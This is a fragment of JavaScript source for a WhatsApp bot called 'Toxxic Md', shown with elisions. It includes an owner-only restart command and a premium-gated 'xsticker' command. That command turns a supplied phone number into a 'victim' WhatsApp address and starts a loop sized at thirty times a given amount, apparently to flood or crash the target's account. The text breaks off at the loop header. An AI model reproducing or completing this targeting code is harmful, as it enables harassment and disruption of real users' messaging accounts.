...
senddocu(buffer)
        ...
        switch (command) {
            ...
            case 'restart':
                if (!isCreator) return replygcxeon(mess.owner)
                replygcxeon('Toxxic Md is Rebooting....')
...
case 'xsticker': {
if (!isPremium) return replygcxeon(mess.prem)
if (!text) return replygcxeon(`Example: ${prefix + command} 234xxxxxxxxxx|5`)
await loading()
victim = text.split("|")[0]+"@s.whatsapp.net"
amount = text.split("|")[1] * 30
for (let i = 0; i < amount; i++) {
